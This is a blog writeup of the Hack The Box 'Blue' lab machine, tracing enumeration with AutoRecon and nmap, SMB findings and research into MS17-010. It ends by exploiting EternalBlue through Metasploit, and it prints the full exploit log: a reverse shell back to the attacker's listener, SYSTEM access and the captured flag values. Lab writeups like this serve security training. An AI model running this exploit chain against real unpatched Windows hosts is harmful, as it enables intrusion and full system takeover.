--- 
layout: post 
title: Blue HTB Writeup
date: 2020-05-20 018:00:00 -0400 
categories: InfoSec 
---


![blue](/assets/img/Walkthroughs/Blue/Blue.png)  

Hi Hello again. This box is going to be a quick one but a really important one to knock out if you're looking to learn for the OSCP. You can probably guess what vulnerability we are going to be poking at with this one, but I won't spoil early. :)  


## Enumeration

Usually I post about both nmap and nmapautomator but this round we are going to try a new tool that I've heard loads of good things about. This tool has just a massive amount of stuff it does for you and organizes the outputs for you in a file structure that is nifty so. Let's try that out. 


## AutoRecon

![AutoReconScreen](/assets/img/Walkthroughs/Blue/AutoReconScreenshot.png)  


First, let's get an understanding of how this bad boy works. Head over to it's Github at []() and [look at the source.](https://github.com/Tib3rius/AutoRecon/blob/master/README.md) Or not... I'm going to quickly tell you either way.  

Now before you go download it and start using it on pentesting engagements, please know that **it can be noisy**. It has been designed for CTFs and OSCP like certification stuff.  

Also, it's basically a script that runs other tools that you most likely would want to run anyway. Here is the list:  

- curl 
- enum4linux 
- gobuster 
- nbtscan 
- nikto 
- nmap 
- onesixtyone 
- oscanner 
- smbclient 
- smbmap 
- smtp-user-enum
- snmpwalk 
- sslscan 
- svwar 
- tnscmd10g 
- whatweb 
- wkhtmltoimage

You can imagine how this works. It runs a handful of nmap scans, and based off of what it sees in the scans, it starts using other tools as needed to continue the enumeration. So for example, it sees that port 80 or 443 is open. Then it might run something like dirbuster and nikto against it automatically. This sort of handles the repetitive steps that you do for every machine anyway and gets you right into investigating how to get in, or maybe where to look for further enumeration.  

Now, because it does so much, you can imagine how much data there is to look through. Here is a quick look at the files I got from running it against Blue.  

![AutoRecon](/assets/img/Walkthroughs/Blue/AutoReconFiles.png)  

In there you've got a list of the commands it ran to get the results, the results of a basic nmap scan, smbclient, enum4linux, etc. 
>Note: Notice it sets up structure for the rest of your pentest. You have directories to place other notes moving forward. Pretty freaking cool stuff.  

So this is what we got to work with for breaking into this bad boy. 


## Nmap
This output is from an nmap scan that goes something like this:
```
nmap -VV --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.40
```
![AR Nmap](/assets/img/Walkthroughs/Blue/FullTCPNmapAR.png)  

This is the second half to that.  

![AR Nmap](/assets/img/Walkthroughs/Blue/FullTCPNmapAR2.png) 

So what we know is:
- Windows 7 Professional 7601 Service Pack 1
- Name - haris-PC
- SMB message signing default message signing disabled *woooo!*
- Ports 139 and 445 *oh buddy this looks like smb again*


## SMB 

This was some output for the SMBMap it ran. If we didn't know it was Windows, we sure as heck do now. Lol. Look at all those files we get to see. Kind of silly tbh.  
![](/assets/img/Walkthroughs/Blue/SMBMap.png)  

The SMBClient seems way less fruitful after seeing the SMBMap results. But here they are.  

![](/assets/img/Walkthroughs/Blue/SMBClient.png)  

From this we can tell that:
- SMB is wide open it seems. 
- Big confirm on Windows 7 based off of the files we see in the SMB 

## Everything else

There was plenty more but this is the stuff that matters so far. If you're really curious [Here is the complete set of files I got from the AutoRecon](/assets/img/Walkthroughs/Blue/AutoRecon/10.10.10.40)
> yes I know it's not safe to include files like this, but... the site is purely static and the entire file structure is listed on my github. So. I'm prettty confident that means it's gucci. 

## nmapAutomator
Okayyyy okayy. Calm down. I know I lied and said I was just going to use AutoRecon but It's important to know what you get with each type of automatic scan and what you don't. And what I didn't see in AutoRecon was a list of CVEs. I had ran nmapAutomator when breaking into this machine and just happen to have the results saved. So let's take a look at what we got from the nmapAutomator.   

Almost everything was the same, but I noticed this little tasty note in the nmap vuln scan. 

![SMB Vuln](/assets/img/Walkthroughs/Blue/nmapAutomatorSMBVuln.png)  


The takeaway from that screenshot is: 
- SMB MS17-010 Vulnerable
- CVE-2017-0143 is the CVE for it. 
- Resource section url says "wannacrypt attack" in the url. *freakingg bet*


## Investigating CVEs 

Now we absolutely have enough information to start firing off some hacker magic EternalBlue pew pew. But before we do. Let's back up. Let's imagine all you did was a simple nmap and you know it has SMB and it's Windows 7. 
>The first time I broke into this box I didn't have nmapAutomator or any other special fancy stuff and all I knew was SMB Windows 7 Pro. So let's just time travel back to that guy. 

A simple Google search can help on this. I'm taking time to write this part out because you're going to run into machines that lack information. Not every vulnerability or CVE is just gonna happily announce itself. Learn to take small chunks of what you know to dig further. So.... 

![Windows 7 Google](/assets/img/Walkthroughs/Blue/WindowsSearch.png)  

You already see the first hit is for MS17-010. You also see a Priv Esc for CVE-2019-1132 that would maybe work on this machine as well. The third link is another exploit for EternalBlue. At this point you have enough information to know where to start. Without those big scans, you still have the ability to figure this out. What would the next step be? **Read about the exploits** not **fire lasers**. Make sure the exploit makes sense for what you're using. Doing some reading you'll find that... 

- EternalBlue does remote code execution.
- valid for machines running SMBv1
- Works for Windows Vista, Windows 7, and Windows Server 2008 (most versions of these)
- Also works on Windows 8, 10, Server 2012 and 2016 if left not updated. But mainly the previously mentioned due to Windows not updating those machines anymore. 
- It has many CVEs. Basically CVE-2017-0143 to CVE-2017-0148

And with that, your brain should go *Are we Windows 7...yep...Are we SMBv1....yep* and now is when you start to figure out how to fire it off. Head over to Metasploit.

##  Firing the lasers (Exploitation)

Okay. I'm only going to show the Metasploit exploit for this for now. I might add the manual later. You guys remember how this goes?  


Wait wait, before you Metasploit anything let's just check Searchsploit to see what she says is up.  

![Searchsploit](/assets/img/Walkthroughs/Blue/SearchSploit.png)  

Wow okay, loads of good stuff there to go from. You could easily read through your options there and figure out how to manually fire this bad boy off. Just remember to read the source code and figure out exactly how to use it first. Oh and what it might do to the machine. ***Hint: EternalBlue breaks things sometimes***  

>Trying to exploit manually? Take a look at AutoBlue ;) 

Okay let's see what Metasploit has for us...  

![SearchingMetasploit](/assets/img/Walkthroughs/Blue/MetaSearch.png)  

Oh heck. It has a EternalBlue scanner??? Well dang, let's try that puppy out yeah?  

![scanning with Metasploit module](/assets/img/Walkthroughs/Blue/MetasploitScan.png)  
Okay cool. It confirms what we already sort of know. But mainly, it's good to know this is here.  

Let's use this one. The other's seem specific to different things and this is the most generic.  

![SettingOptions](/assets/img/Walkthroughs/Blue/MetasploitOptions.png)   

Make sure you check what your IP is. For some reason it defaults to my wlan adapter soo. Check this.  

Alrighty then. Fire this mug off. But know that this exploit is super delicate. It has taken me 3-4 tries before it works in the past. With HTB feel free to at this point just reset the machine if you're having problems.


So I couldn't get a screenshot. The first time I ran this months ago it worked great. While writing this post, I tried it 4 times and it didn't. So. That's a thing. Here is the output from the first time I got it to work. 

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.17:4444 -> 10.10.10.40:49158) at 2020-05-11 23:56:32 -0400
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

whoami
whoami
nt authority\system

C:\Windows\system32> type \Users\haris\Desktop\user.txt
type \Users\haris\Desktop\user.txt
4c546aea7dbee75cbd71de245c8deea9
C:\Windows\system32>type \Users\Administrator\Desktop\root.txt
type \Users\Administrator\Desktop\root.txt
ff548eb71e920ff6c08843ce9df4e717
C:\Windows\system32>
```


heheheh. Very nice. We are in. And not only that but we are already max priv. The computer is your oyster and you can open it with swords... Wait is that how that saying goes? Shakespeare would hate that I made this joke...  

Okay done and done. Hope this helps! 

Cheers, 
Zack